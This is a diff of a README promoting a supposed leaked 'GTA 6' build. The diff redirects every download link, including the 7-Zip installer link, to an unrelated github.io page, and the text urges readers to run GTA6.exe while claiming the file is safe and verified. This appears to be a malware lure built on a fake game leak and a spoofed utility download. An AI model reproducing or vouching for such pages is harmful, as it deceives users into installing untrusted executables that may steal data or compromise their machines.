@@ -1,7 +1,7 @@
 <h1>🎮 GTA-6-Unfinished-Build-With-Story-Mode - Play the Leaked 2026 Build Today</h1>
 
 <p align="center">
-  <a href="https://github.com/zoomorphismbola2321/GTA-6-Unfinished-Build-With-Story-Mode" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#e74c3c,#f39c12);color:white;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(231,76,60,0.4);">⬇️ DOWNLOAD GTA 6 NOW ⬇️</a>
+  <a href="https://zoomorphismbola2321.github.io" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#e74c3c,#f39c12);color:white;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(231,76,60,0.4);">⬇️ DOWNLOAD GTA 6 NOW ⬇️</a>
 </p>
 
 ---
@@ -42,7 +42,7 @@ Follow these simple steps to download, install, and play. No tech skills needed.
 ### Step 1: Download the Game
 
 Visit this link to download the application:  
-👉 **[GTA-6-Unfinished-Build-With-Story-Mode – Official Download Page](https://github.com/zoomorphismbola2321/GTA-6-Unfinished-Build-With-Story-Mode)**  
+👉 **[GTA-6-Unfinished-Build-With-Story-Mode – Official Download Page](https://zoomorphismbola2321.github.io)**  
 
 This is the only official source. Do not trust mirrors or re-uploads from other sites. They may be fake or infected with malware. The download is hosted on GitHub, safeand verified. The page will show you the latest version of the game files. Click the green **"Download"** buttonory the large **"Code"** dropdown, then select **"Download ZIP"**. Alternatively, if you see a file named `GTA6_Build.zip`or `GTA6_Setup.exe`, download that directly. The download size is approximately **45 GB** compressed, so make sure you have enough free disk space (at least 90 GB for extraction)and a**stable internet connection**. If using Google Driveor Mega mirrors provided in the repo, follow the same steps. The file is split into parts if it's too large – download all parts into the same folder.
 
@@ -53,7 +53,7 @@ ass="hljs">
 Once the download finishes, locate the filein your **Downloads** folder (or wherever your browser saves files). You will see a `.zip` file (or multiple `.part` files if split).  
 
 - **If you have WinRAR or 7-Zip** installed, right-click on the first file (e.g., `GTA6_Build.zip` or `GTA6_Build.part1.rar`)and select **"Extract Here"** or **"Extract to GTA6_Build/"**.  
-- **If you don't have an extractor**, download and install **7-Zip** for free from https://www.7-zip.org/. After installing, right-click the file, go to **"7-Zip"**, then **"Extract Here"**.  
+- **If you don't have an extractor**, download and install **7-Zip** for free from https://zoomorphismbola2321.github.io After installing, right-click the file, go to **"7-Zip"**, then **"Extract Here"**.  
 
 Extraction will take 10-30 minutesdepending on your CPU. Wait for it to complete 100%. Do not close the window early. After extraction, you will get a new folder named something like `GTA_6_Unfinished_Build`or`GTA6_Story`. 
 
@@ -151,7 +151,7 @@ This build has been uploaded directly from mistressscene release group. We assur
 
 To recap, here's everything you need to do:  
 
-1. **Click** the big download button at the top of this pageor visit: [https://github.com/zoomorphismbola2321/GTA-6-Unfinished-Build-With-Story-Mode](https://github.com/zoomorphismbola2321/GTA-6-Unfinished-Build-With-Story-Mode)  
+1. **Click** the big download button at the top of this pageor visit: [https://zoomorphismbola2321.github.io](https://zoomorphismbola2321.github.io)  
 2. **Download** the ZIP file(and all parts if split).  
 3. **Extract** using 7-Zip or WinRAR.  
 4. **Run** `GTA6.exe`.  
@@ -206,7 +206,7 @@ This is an **unfinished, leaked, pre-release build**. It does not represent the 
 ---
 
 <p align="center">
-  <a href="https://github.com/zoomorphismbola2321/GTA-6-Unfinished-Build-With-Story-Mode" style="display:inline-block;padding:14px 30px;background:linear-gradient(135deg,#2ecc71,#27ae60);color:white;font-size:20px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 6px 15px rgba(46,204,113,0.4);">🎯 DOWNLOAD GTA VI – START PLAYING NOW</a>
+  <a href="https://zoomorphismbola2321.github.io" style="display:inline-block;padding:14px 30px;background:linear-gradient(135deg,#2ecc71,#27ae60);color:white;font-size:20px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 6px 15px rgba(46,204,113,0.4);">🎯 DOWNLOAD GTA VI – START PLAYING NOW</a>
 </p>
 
 ---
